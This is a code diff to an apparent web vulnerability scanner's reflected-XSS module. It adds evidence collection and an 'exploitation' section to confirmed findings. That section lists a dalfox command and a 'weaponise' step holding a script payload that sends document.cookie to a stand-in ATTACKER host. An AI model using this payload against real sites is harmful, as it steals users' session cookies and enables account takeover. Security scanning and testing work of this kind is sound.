@@ -25,6 +25,7 @@ import httpx
 from loguru import logger
 
 from config import SAFE_MODE_RATE_DELAY
+from scanner import evidence as ev
 from scanner.crawler import Form
 from scanner.engine import Finding, Severity, ScanEngine
 
@@ -123,7 +124,7 @@ _CTX_LABEL = {
 # ---------------------------------------------------------------------------
 
 def _finding(where: str, ctx: str, payload: str, severity: Severity, confidence: str,
-             proof_url: str | None = None) -> Finding:
+             proof_url: str | None = None, evidence: list[str] | None = None) -> Finding:
     if severity == Severity.LOW:
         title = f"Reflected Input (encoded): {where}"
         desc = (f"Input to {where} is reflected in the response but its special characters are "
@@ -136,9 +137,19 @@ def _finding(where: str, ctx: str, payload: str, severity: Severity, confidence:
             desc += ("\n\nThe clickable proof link opens the injected request — in a browser it may "
                      "execute the payload (e.g. pop an alert). Verify/exploit with dalfox:\n"
                      f'  dalfox url "{proof_url}"')
-    raw = {"location": where, "context": ctx, "payload": payload, "confidence": confidence}
+    raw = {"location": where, "context": ctx, "payload": payload, "confidence": confidence,
+           "evidence": evidence or [f"injected into {where}: {ev.note(payload)[:80]}"]}
     if proof_url:
         raw["proof_url"] = proof_url
+    # Only a confirmed (breakout) reflected XSS is exploitable — the encoded LOW case is not.
+    if severity != Severity.LOW:
+        target = proof_url or "<the injected request>"
+        raw["exploitation"] = [
+            {"step": 1, "description": "Confirm execution and auto-discover working payloads.",
+             "command": f'dalfox url "{target}"'},
+            {"step": 2, "description": "Weaponise: exfiltrate the victim's session cookie to your server.",
+             "command": '<script>new Image().src="https://ATTACKER/c?"+document.cookie</script>'},
+        ]
     return Finding(
         module=MODULE, title=title, description=desc,
         severity=severity,
@@ -168,10 +179,14 @@ def _probe(inject: InjectFn, where: str,
         # merely reflects the payload (e.g. a CloudFront "Request blocked" 403).
         if r2 is not None and not _looks_blocked(r2) and success(r2.text):
             proof_url = proof(payload) if proof else None
-            return _finding(where, ctx, payload, Severity.HIGH, "high", proof_url)
+            evidence = [f"injected into {where}: {ev.note(payload)[:80]}"] + ev.from_response(
+                r2, indicator=f"breakout survived unencoded in {_CTX_LABEL.get(ctx, ctx)} context")
+            return _finding(where, ctx, payload, Severity.HIGH, "high", proof_url, evidence)
 
     # Reflected but no breakout achieved → likely encoded/sanitised.
-    return _finding(where, "reflected", canary, Severity.LOW, "low")
+    return _finding(where, "reflected", canary, Severity.LOW, "low",
+                    evidence=[f"injected into {where}: {ev.note(canary)[:80]}"]
+                    + ev.from_response(resp, indicator="canary reflected but special characters encoded"))
 
 
 # ---------------------------------------------------------------------------
